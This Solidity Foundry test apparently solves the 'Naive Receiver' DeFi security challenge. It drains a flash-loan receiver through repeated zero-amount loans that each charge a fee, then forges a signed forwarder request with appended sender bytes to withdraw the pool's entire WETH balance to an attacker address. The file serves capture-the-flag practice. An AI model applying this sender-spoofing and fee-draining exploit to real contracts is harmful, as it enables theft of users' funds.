// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {Test,console} from "forge-std/Test.sol";
import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {Multicall} from "../../src/naive-receiver/Multicall.sol"; 
 contract NaiveReceiverTest is Test {


 NaiveReceiverPool pool;
 FlashLoanReceiver receiver;
 WETH weth;
 BasicForwarder forwarder;

 uint256 poolbalance = 1000e18;
 uint256 receiverbalance = 10e18;

 address deployer = makeAddr("deployer");
 address feereceiver = makeAddr("feeReceiver");

 address attacker ;
 uint256 attackerPrivateKey = 0xA11CE;

 function setUp() public{

    weth = new WETH();
    forwarder = new BasicForwarder();

    vm.deal(deployer, poolbalance);

    vm.startPrank(deployer);

    pool = new NaiveReceiverPool{value: poolbalance}
    (address(forwarder),
     payable(weth),
      feereceiver
      );

      vm.stopPrank();

    receiver = new FlashLoanReceiver(address(pool));

   weth.deposit{value: receiverbalance}();
 // firstly we deposit the weth amount of receivverbalance Eth in the weth contract
   weth.transfer(address(receiver), receiverbalance);
   attacker = vm.addr(attackerPrivateKey);
 }
  function test_flashloan() public {
    assertEq(weth.balanceOf(address(pool)), 1000e18);
    assertEq(weth.balanceOf(address(receiver)), 10e18);

    vm.startPrank(address(attacker));

  bytes memory data = "";

  for(uint i=0 ; i<10; i++){
  pool.flashLoan(receiver,address(weth), 0 , data);
  }
   vm.stopPrank();

   assertEq(weth.balanceOf(address(receiver)),0);
   assertEq(weth.balanceOf(address(pool)), 1010e18);


  bytes memory callforDeployer = abi.encodeCall(NaiveReceiverPool.withdraw,(1000e18, payable (attacker)));
  bytes memory newcalldata = abi.encodePacked(callforDeployer , deployer);

  bytes memory callforReceiver = abi.encodeCall(NaiveReceiverPool.withdraw,(10e18, payable(attacker)));
  bytes memory secondCalldata = abi.encodePacked( callforReceiver , feereceiver);
  bytes[] memory newcalls = new bytes[](2);
   newcalls[0] = newcalldata;
   newcalls[1] = secondCalldata;


   BasicForwarder.Request memory request ;
    request.from = attacker;
    request.target = address(pool);
    request.value = 0;
    request.gas = 1000000;
    request.nonce = forwarder.nonces(attacker);
    request.data = abi.encodeCall(Multicall.multicall,(newcalls));
    request.deadline= block.timestamp + 1000;

// 1. Calculate request struct hash
 bytes32 structHash = forwarder.getDataHash(request);
// 2. Get EIP-712 domain separator
 bytes32 domainSeparator = forwarder.domainSeparator();

// 3. Calculate final EIP-712 digest

 bytes32 digest = keccak256(
    abi.encodePacked(
        hex"1901",
        domainSeparator,
        structHash
    )
);

(uint8 v , bytes32 r, bytes32 s) = vm.sign(attackerPrivateKey , digest);

bytes memory signature = abi.encodePacked( r ,s , v);

   forwarder.execute(request , signature);

 assertEq(weth.balanceOf(address(pool)), 0);
 assertEq(weth.balanceOf(address(receiver)), 0);
 assertEq(weth.balanceOf(address(attacker)), 1010e18);
 }

  }

 